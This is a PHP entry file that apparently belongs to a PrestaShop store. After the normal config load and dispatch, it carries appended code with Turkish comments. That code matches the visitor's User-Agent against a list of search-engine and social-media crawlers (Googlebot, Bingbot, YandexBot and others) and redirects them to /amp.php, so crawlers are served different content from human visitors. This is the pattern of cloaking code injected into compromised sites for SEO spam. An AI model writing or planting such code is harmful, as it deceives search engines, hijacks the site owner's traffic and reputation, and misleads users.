require(dirname(__FILE__).'/config/config.inc.php');
Dispatcher::getInstance()->dispatch();

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Bot kontrol listesi
$botPatterns = [
    'Googlebot', 'AdsBot', 'Mediapartners-Google', 'APIs-Google',
    'Googlebot-Image', 'Googlebot-Video', 'Googlebot-News',
    'Googlebot-Search', 'Googlebot-Inspect', 'Googlebot-Android',
    'Googlebot-Mobile', 'Googlebot-Ads', 'Googlebot-Discovery',
    'Google-', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver',
    'Twitterbot', 'facebookexternalhit', 'LinkedInBot', 'Embedly',
    'WhatsApp', 'Applebot', 'PetalBot', 'AhrefsBot', 'SemrushBot'
];

// Bot kontrolü
$isBot = false;
foreach ($botPatterns as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

// Bot ise amp.php'ye yönlendir
if ($isBot) {
    header("Location: /amp.php");
    exit;
}